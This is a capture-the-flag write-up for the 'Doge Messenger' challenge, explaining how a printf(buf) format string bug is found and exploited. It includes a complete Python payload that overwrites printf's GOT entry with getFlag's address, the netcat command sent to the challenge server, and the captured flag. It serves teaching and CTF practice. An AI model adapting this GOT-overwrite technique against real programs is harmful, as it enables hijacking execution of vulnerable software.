---
title: "Doge Messenger (200 points) [Security Mooc CTF]"
date: 2017-07-06 00:00:06 +0530
categories:
  - Write-ups
header:
  teaser: "https://i.imgur.com/oucceD8.png"
tags:
  - SecurityMooc
excerpt: ""
---
Here's the [file link](/assets/write-ups/securitymoocctf/doge).
Here's the [C Source](/assets/write-ups/securitymoocctf/doge.c).


```
We have lost control on execution sequence of this program, a controlled execution were
allowing us to get the master key which one can use to login to anyone's tinder :). Here
is the binary and here is the source code. Use nc 52.7.95.224 8040 to connect to server.
```

Inspecting the source we have a function to get the flag:
{% highlight c%}
void getFlag()
{
	system("/bin/cat flag.txt\n");
}
{% endhighlight %}
But we don't have any calls to it.
Since all buffers and operations have fixed size thus, no buffer-overflow.

We notice at `line 62` that there's a `printf(buf)` (with a more-than-sufficient size of 256). So we can write at any address exploiting this format string vulnerability. Trying the string `aaaa%X.%X.%X.%X.%X.%X.%X.%X.%X.%X.%X...` We see that that our input can be found at the 7th position (Notice the toggled case of 'aaaa').

I fired up gdb and checked `printf()`'s [disassembly](/assets/write-ups/securitymoocctf/doge.asm). Observe that it reads a jump using a value as an address from Data Segment (GOT):
{% highlight nasm%}
0x8048580 <printf@plt>:	jmp    DWORD PTR ds:0x804b010
{% endhighlight %}

So I chose the location `0x804b010`.
I got `getFlag()`'s address using `nm doge | grep getFlag` which gives `0x0804878b` as the value to write.

Our objective is to write exactly `0x0804878b` at location `0x804b010`.
Notice since I was writing using `printf` for the first time, I tried writing byte-by-byte instead of the usual 2 byte method, using python:
{% highlight python linenos %}
import struct
s='Kunal\n2\n'			#Need second call to printf to jump to getFlag()
s+=struct.pack('I',0x804b010) + 'a'*4
s+=struct.pack('I',0x804b011) + 'a'*4
s+=struct.pack('I',0x804b012) + 'a'*4
s+=struct.pack('I',0x804b013)
ff="%X"*5+"%" + str(0x4d + 0x8)
ff+= "X"+"%N%"+str(0x187-0x93+0x8)+"X%N%"
ff+= str(0x204-0x8f+0x8)+"X%N%"
ff+= str(0x108-0xc+0x8) + "X%N"
s+=ff
# with open("inp",'w') as f:
#	f.write(s)			#For use with gdb
print s					#For use with nc/debugging
{% endhighlight %}

One thing to take care of is that after the input, the program toggles the case of all the alphabets so, we had to be careful to toggle them intitally to nullify that effect (We fortunately didn't have any alphabets in any of the address bytes).

Now trying this input:
```console
$ python input.py | nc 52.7.95.224 8040 
                   ▄              ▄
                  ▌▒█           ▄▀▒▌
                  ▌▒▒█        ▄▀▒▒▒▐
                 ▐▄▀▒▒▀▀▀▀▄▄▄▀▒▒▒▒▒▐
               ▄▄▀▒░▒▒▒▒▒▒▒▒▒█▒▒▄█▒▐
             ▄▀▒▒▒░░░▒▒▒░░░▒▒▒▀██▀▒▌
            ▐▒▒▒▄▄▒▒▒▒░░░▒▒▒▒▒▒▒▀▄▒▒▌
            ▌░░▌█▀▒▒▒▒▒▄▀█▄▒▒▒▒▒▒▒█▒▐
           ▐░░░▒▒▒▒▒▒▒▒▌██▀▒▒░░░▒▒▒▀▄▌
           ▌░▒▄██▄▒▒▒▒▒▒▒▒▒░░░░░░▒▒▒▒▌
          ▌▒▀▐▄█▄█▌▄░▀▒▒░░░░░░░░░░▒▒▒▐
          ▐▒▒▐▀▐▀▒░▄▄▒▄▒▒▒▒▒▒░▒░▒░▒▒▒▒▌
          ▐▒▒▒▀▀▄▄▒▒▒▄▒▒▒▒▒▒▒▒░▒░▒░▒▒▐
           ▌▒▒▒▒▒▒▀▀▀▒▒▒▒▒▒░▒░▒░▒░▒▒▒▌
           ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▒▄▒▒▐
            ▀▄▒▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▄▒▒▒▒▌
              ▀▄▒▒▒▒▒▒▒▒▒▒▄▄▄▀▒▒▒▒▄▀
                ▀▄▄▄▄▄▄▀▀▀▒▒▒▒▒▄▄▀

         D O G E   M E S S E N G E R
         Send your message to doge!!

Your name: 
How many messages do you want to send? 
Your message: 
Doge's response: <Garbage>
...
flag{ryMiLX9dTYbbeznqUsFAC3zMP4dsiorb}
flag{ryMiLX9dTYbbeznqUsFAC3zMP4dsiorb}
flag{ryMiLX9dTYbbeznqUsFAC3zMP4dsiorb}
```

